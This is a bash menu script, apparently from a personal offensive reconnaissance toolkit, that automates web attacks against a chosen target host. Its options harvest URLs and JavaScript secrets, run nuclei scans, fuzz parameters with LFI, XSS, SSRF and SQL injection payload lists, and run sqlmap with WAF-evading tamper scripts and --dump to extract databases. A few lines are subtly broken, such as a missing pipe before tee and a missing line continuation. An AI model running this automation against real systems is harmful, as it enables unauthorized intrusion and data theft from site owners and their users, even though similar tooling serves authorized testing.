#!/bin/bash

#-------------------------------------------------------------------------------------------------------------------------------------------
#		08_ACTIVE.sh -- priest:	Hope that firewall works because your screwed
#
#		Tested: Debian 13 (trixie)
#-------------------------------------------------------------------------------------------------------------------------------------------
#
# 		apt-get install jq dnsutils whois curl
#
# 		Insert following into .bashrc if required
#
# 		if [ -f ~/.bash_genesis ]; then
# 		  . ~/.bash_genesis
# 		fi
#
# 		source .bashrc
#
#-------------------------------------------------------------------------------------------------------------------------------------------
#		Settings	------------------------------------------------------------------------------------------------------------
#
# 		export MODULES=$HOME/genesis/modules
#
#		recon.host <target.com> ; unset HOST
#
#		-mc 200-299,301,302,307,401,403,405,500 -> ffuf
#		--exclude-status=301,302,400-402,404-499,500-599 -> dirsearch
#
#-------------------------------------------------------------------------------------------------------------------------------------------

if [ -z "${HOST}" ]; then
	echo "Usage: recon.host <target.com>"
	exit 1
else 
	cd $HOME/WORKZONE/data-active/$HOST
	echo -e "TARGET: $PWD\n"
	PS3="Please select an option : "
	choices=("GAU" "JS-PARSE" "NUCLEI" "LFI" "XSS" "SSRF-BLIND" "SSRF-REDIRECT" "SQLI-POST" "SQLI-GET" "SQLMAP" "FFUF-common" "FFUF-subdomains" "DIRSEARCH" "DIRSEARCH-attacks" "ARJUN" "EXIT")

	select choice in "${choices[@]}"; do
		case $choice in

		GAU)
			echo "GAU && GREP Extraction  : -E 'www.' httpx.alive.db : Filtered servers only"


			cat httpx.alive.www.db | gau | uro | anew data-enumeration/urls/gau.alive.db	# 'www.' servers only 

			cat httpx.alive.db | grep -E "admin|administrator|root|sysadmin|secure|api|gateway|auth|login|sso|dev|developer|test|stage|staging|uat|beta|demo|internal|intranet|vpn|portal|dashboard|manage|management|config|control|server|db|database|backup|files|static|cdn" | anew data-enumeration/urls/httpx.alive.interesting-subdomains.db


			cat data-enumeration/urls/gau.alive.db | grep -E "admin|administrator|root|sysadmin|secure|api|gateway|auth|login|sso|dev|developer|test|stage|staging|uat|beta|demo|internal|intranet|vpn|portal|dashboard|manage|management|config|control|server|db|database|backup|files|static|cdn" | anew data-enumeration/urls/gau.alive.interesting-subdirectories.db

			cat data-enumeration/urls/gau.alive.db | grep -Eo 'https?://[^"]+' | cut -d '/' -f 1,2,3,4 | anew | sed 's/\/\+$//' | anew data-enumeration/urls/gau.alive.subdirectories.filtered.db	
			# select a subdomain or child directory to scan for attacks
			# GOTO DIRSEARCH-attacks

			cat data-enumeration/urls/gau.alive.db | grep ".js$" | uro | sort -u | tee data-enumeration/js/gau.alive.js.db
			grep -Eo 'https?://[^"]+' data-enumeration/urls/gau.alive.db | grep -Eo '[^*]*/' | anew data-enumeration/urls/gau.alive.subdirectories.db
			grep -v ".js?\|.js$" data-enumeration/urls/gau.alive.db | grep -E '\?.+=' | anew data-enumeration/urls/gau.alive.params.full.db
			grep -v '[[:upper:]]' data-enumeration/urls/gau.alive.params.full.db | anew data-enumeration/urls/gau.alive.params.db
			grep robots.txt data-enumeration/urls/gau.alive.db | tee data-enumeration/urls/gau.alive.robots.txt.db

			sleep 1
			break
			;;


		JS-PARSE)

			echo "JS-PARSE"

			cat data-enumeration/js/gau.alive.js.db | jsleak -s -l -k | tee data-enumeration/js/jsleak.db
			grep "Found link" data-enumeration/js/jsleak.db | cut -d ' ' -f 6 | tr -d [] | anew data-enumeration/js/jsleak.links.db

#	(?)		grep -oE 'http[s]?://[^"]*.s3.amazonaws.com

			cat data-enumeration/js/jsleak.links.db | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*.amazonaws.com' | sort -u | anew data-enumeration/cloud/js.aws.db
			cat data-enumeration/urls/gau.alive.db | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*.amazonaws.com' | sort -u | anew data-enumeration/cloud/js.aws.db

#	(?) .com.eu	cat data-enumeration/urls/gau.alive.db | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*.amazonaws.com[^" ]*' | sort -u | anew data-enumeration/cloud/js.aws.db
#	(?) etc...	cat data-enumeration/js/jsleak.links.db | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*.amazonaws.com[^" ]*' | sort -u | anew data-enumeration/cloud/js.aws.db

			nuclei -list data-enumeration/js/gau.alive.js.db -vv -c 25 -rl 500 -fhr -lfa -t $HOME/WORKLISTS/nuclei-neural/coffinxp/s3-detect.yaml -H " " -o data-enumeration/cloud/s3-detect.gau.alive.js.db
			nuclei -list data-enumeration/js/jsleak.links.db -vv -c 25 -rl 500 -fhr -lfa -t $HOME/WORKLISTS/nuclei-neural/coffinxp/s3-detect.yaml -H " " -o data-enumeration/cloud/s3-detect.jsleak.links.db

			cat massdns.alive.ips.db | while read value ; do key=$(host $value | cut -d " " -f 5 | grep 'aws.com' | sed 's/com.$/com/') ; echo "$value $key" | grep 'aws.com' ; done | anew data-enumeration/cloud/aws.IP2Host.db

			cat data-enumeration/js/gau.alive.js.db | while read url; do SecretFinder -i $url -o cli | tee data-enumeration/js/secretfinder.gau.alive.js.db ; done
			cat data-enumeration/js/jsleak.links.db | while read url; do SecretFinder -i $url -o cli | tee data-enumeration/js/secretfinder.jsleak.links.db ; done

			cat data-enumeration/js/gau.alive.js.db | nuclei -t /home/user/WORKLISTS/nuclei-neural/coffinxp/credentials-disclosure-all.yaml -o data-enumeration/js/credentials-disclosure.gau.alive.js.db
			cat data-enumeration/js/jsleak.links.db | nuclei -t /home/user/WORKLISTS/nuclei-neural/coffinxp/credentials-disclosure-all.yaml -o data-enumeration/js/credentials-disclosure.jsleak.links.db

			sleep 1
			break
			;;


		NUCLEI)

			echo "NUCLEI"
			nuclei -list data-enumeration/urls/gau.alive.db -vv -c 25 -rl 500 -severity high,critical -t ~/nuclei-templates/http/exposures -o data-enumeration/nuclei/exposures.db
			nuclei -list data-enumeration/urls/gau.alive.db -vv -c 25 -rl 500 -severity high,critical -t ~/nuclei-templates/http/vulnerabilities/generic -o data-enumeration/nuclei/generic.db
			nuclei -list data-enumeration/urls/gau.alive.db -vv -c 25 -rl 500 -severity high,critical -t ~/nuclei-templates/dast -dast -o data-enumeration/nuclei/dast.db

			sleep 1
			break
			;;


		LFI)
			echo "LFI"

			cat data-enumeration/urls/gau.alive.params.db | \
				gf lfi | \
				qsreplace "FUZZ" | \
				anew | \
				while read url ; \
					do \
						ffuf -u $url \
						-w $HOME/genesis/payloads/lfi.db:FUZZ \
						-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
						-c \
						-t 40 \
						-rate 10 \
						-p 2 \
						-mr "root:[x*]:0:0:" \
						-od data-enumeration/lfi \
						-of json \
						-o data-enumeration/lfi.ffuf.json \
				; done
#			jq -C ".results[] | select(.status=="200") | .url" data-enumeration/lfi.ffuf.json | tr -d '"'

			sleep 1
			break
			;;


		XSS)
			echo "XSS"

			cat data-enumeration/urls/gau.alive.params.db | \
				gf xss | \
				qsreplace "FUZZ" | \
				anew | \
				while read url ; \
					do \
						ffuf -u $url \
						-w $HOME/genesis/payloads/xss.db:FUZZ \
						-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
						-c \
						-t 40 \
						-rate 10 \
						-p 2 \
						-mr "xss.db" \
						-od data-enumeration/xss \
						-of json \
						-o data-enumeration/xss.ffuf.json \
				; done
#			jq -C ".results[] | select(.status=="200") | .url" data-enumeration/xss.ffuf.json | tr -d '"'

			sleep 1
			break
			;;


		SSRF-BLIND)

			echo "SSRF-BLIND Redirect"

			cat data-enumeration/urls/gau.alive.params.db | \
				gf ssrf | \
				qsreplace "$SSRF.collaborator_link" | \
				anew | \
				while read url ; \
					do \
						ffuf -u $url \
						-w FUZZ \
						-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
						-c \
						-t 40 \
						-rate 10 \
						-p 2 \
						-mr "collaborator_link" \
						-od data-enumeration/ssrf-blind \
						-of json \
						-o data-enumeration/ssrf-blind.ffuf.json \
				; done

			sleep 1
			break
			;;


		SSRF-REDIRECT)

			echo "SSRF-Internal-redirect"

			cat data-enumeration/urls/gau.alive.params.db | \
				gf redirect | \
				qsreplace "FUZZ" | \
				anew | \
				while read url ; \
					do \
					ffuf -u $url \
						-w $HOME/genesis/payloads/ssrf.db:FUZZ \
						-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
						-c \
						-t 40 \
						-rate 10 \
						-p 2 \
						-mr "keyword" \
						-od data-enumeration/ssrf-redirect \
						-of json \
						-o data-enumeration/ssrf-redirect.ffuf.json \
				; done

			sleep 1
			break
			;;


		SQLI-POST)

			echo "SQLI-POST"

			cat data-enumeration/urls/gau.alive.params.db | \
				gf sqli | \
				qsreplace "FUZZ" | \
				anew | \
				while read url ; \
					do \
					ffuf -u $url \
						-X POST \
						-d {"FUZZ"} \
						-w $HOME/genesis/payloads/sqli.db:FUZZ \
						-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
						-c \
						-t 40 \
						-rate 10 \
						-p 2 \
						-mr "error|syntax" \
						-od data-enumeration/sqli-post \
						-of json \
						-o data-enumeration/sqli-post.ffuf.json \
				; done

			sleep 1
			break
			;;


		SQLI-GET)

			echo "SQLI-GET"

			cat data-enumeration/urls/gau.alive.params.db | \
				gf sqli | \
				qsreplace "FUZZ" | \
				anew | \
				while read url ; \
					do \
					ffuf -u $url \
						-X GET \
						-w $HOME/genesis/payloads/sqli.db:FUZZ \
						-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
						-c \
						-t 40 \
						-rate 10 \
						-p 2 \
						-mr "error|syntax" \
						-od data-enumeration/sqli-get \
						-of json \
						-o data-enumeration/sqli-get.ffuf.json \
				; done

			sleep 1
			break
			;;


		SQLMAP)
			echo "SQLMAP"
	
			# Determine SQL Database type/version, then modify --dbms mysql

			cat data-enumeration/urls/gau.alive.params.db | \
				gf sqli | \
				anew | \
				while read url ; \
					do \
					sqlmap -u $url \
						--flush-session \
						--batch \
						--random-agent \
						--risk 1 \
						--level 5 \
						--tamper="between,randomcase,space2comment" \
						-v 1 \
						--dbs \
						--tables \
						--delay=1 \
						--no-cast \
						--no-escape \
						--technique=EUB \
						--dump \
						tee data-enumeration/sqli-sqlmap.db \
				; done
		
			sleep 1
			break
			;;


		FFUF-common)

			echo "ffuf-common.txt"

			echo $HOST | \
				while read host ; \
					do \
					ffuf -u https://$host/FUZZ \
						-w $HOME/genesis/payloads/common.txt:FUZZ \
						-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
						-c \
						-t 250 \
						-rate 250 \
						-p 2 \
						-fc 301,302,400-402,404-499,500-599 \
						-recursion \
						-recursion-depth 2 \
						-od data-enumeration/ffuf-common \
						-of json \
						-o data-enumeration/$HOST.directories.json \
				; done

			jq -C ".results[] | select(.status=="200") | .url" data-enumeration/$HOST.directories.json | tr -d '"'

			sleep 1
			break
			;;


		FFUF-subdomains)

			# vhosts: $HOST_IP=ip

			echo "ffuf-subdomains"

			echo $HOST | \
				while read host ; \
					do \
					ffuf -u https://FUZZ.$host \
						-w $HOME/genesis/payloads/fierce-hostlist.txt:FUZZ \
						-H "Host: FUZZ.$HOST" \
						-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
						-c \
						-t 250 \
						-rate 250 \
						-p 2 \
						-mc 200-299,301,302,307,401,403,405,500 \
						-od data-enumeration/fuff-subdomains \
						-of json \
						-o data-enumeration/$HOST.subdomains.json \
				; done

			jq -C ".results[] | select(.status=="200") | .input.FUZZ" data-enumeration/$HOST.subdomains.json | tr -d '"' | anew 

			sleep 1
			break
			;;


		DIRSEARCH)

			echo "DIRSEARCH"

			dirsearch -l httpx.alive.www.db \
				-w $HOME/genesis/payloads/Wordpress.paths.txt
				--exclude-status=301,400-402,404-499,500-599 \
				--random-agent \
				-t 40 \
				-R 2 \
				-F \
				-o data-enumeration/dirsearch/wordpress.dir.db

			awk -F ' ' '{print $3}' data-enumeration/dirsearch/wordpress.dir.db | tee data-enumeration/dirsearch/wordpress.db ; rm data-enumeration/dirsearch/wordpress.dir.db

			nuclei -list data-enumeration/dirsearch/wordpress.db -vv -c 25 -rl 500 -t $HOME/nuclei-templates/http/vulnerabilities/wordpress/ -o data-enumeration/nuclei/wordpress.db


			sleep 1
			break
			;;


#		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#		Amazing method: idor+sql url path+post method+originIp sql bypass+git+env disclosure:
#		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#		subfinder -d vulnweb.com -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
#
#		echo 'http://vulnweb.com/' | gau
#		echo 'http://testphp.vulnweb.com/' | gau
#		echo 'http://testphp.vulnweb.com/admin | gau
#		echo 'http://testphp.vulnweb.com/admin' <---=
#		grep -Eo 'https?://[^"]+' | cut -d '/' -f 1,2,3,4 | anew | sed 's/\/\+$//'  	
#		select a subdomain or child directory to scan for attacks

		DIRSEARCH-attacks)

			echo "DIRSEARCH-all_attacks.txt"

			echo $URL | \
				while read host ; \
					do \
						dirsearch -u $host \
						-w $HOME/genesis/payloads/all_attacks.txt \
						--random-agent \
						--threads 100 \
						--timeout=10 \
						-e \ asp,aspx,bat,c,cfm,cgi,css,com,dll,exe,hta,htm,html,inc,jhtml,js,jsa,json,jsp,log,mdb,nsf,pcap,php,php2,php3,php4,php5,php6,php7,phps,pht,phtml,pl,phar,rb,rb~,reg,sh,shtml,sql,swf,txt,xml,conf,config,bak,bkp,backup,swp,swp~,old,db,rar,sql.gz,sql.zip,sql.tar.gz,tar,tar.bz2,tar.gz,py,py~,cache \
						-i 200 \
						--full-url \
						-o data-enumeration/dirsearch/all_attacks.db \
				; done

			sleep 1
			break
			;;

#		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

		ARJUN)
			
			echo "arjun"
			mkdir -p "data-enumeration/arjun"
			arjun -i data-enumeration/urls/gau.alive.params.db -oJ data-enumeration/arjun/arjun.json -oT output.json -t 20 --rate-limit 20 --headers "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" -w $HOME/WORKZONE/tools/Arjun/arjun/db/large.txt

			#	$HOME/WORKLISTS/SecLists/Discovery/Web-Content/burp-parameter-names.txt

			jq -r '.[].params' data-enumeration/arjun/arjun.json | cut -d '"' -f2 | tr -d [] | sed '/^[[:space:]]*$/d' | anew data-enumeration/arjun/keys.db


# Combine 		cat data-enumeration/arjun/keys.1.db | unfurl -u keys | anew data-enumeration/arjun/arjun/keys.1.db
#	 		cat data-enumeration/urls/gau.alive.params.db | unfurl -u keys | anew data-enumeration/arjun/arjun/keys.2.db


# Key / paths		cat data-enumeration/arjun/arjun.params.db | unfurl format %s://%d%p | anew data-enumeration/arjun/paths.1.db
#			cat data-enumeration/urls/gau.alive.params.db | unfurl format %s://%d%p | anew data-enumeration/arjun/paths.2.db


#			keys.db
#			paths.db

			sleep 1
			break
				;;


		EXIT)
			echo "Aborting,...!!"
			exit 1
			;;
	esac	
done
fi
#-------------------------------------------------------------------------------------------------------------------------------------------
# EOF
#-------------------------------------------------------------------------------------------------------------------------------------------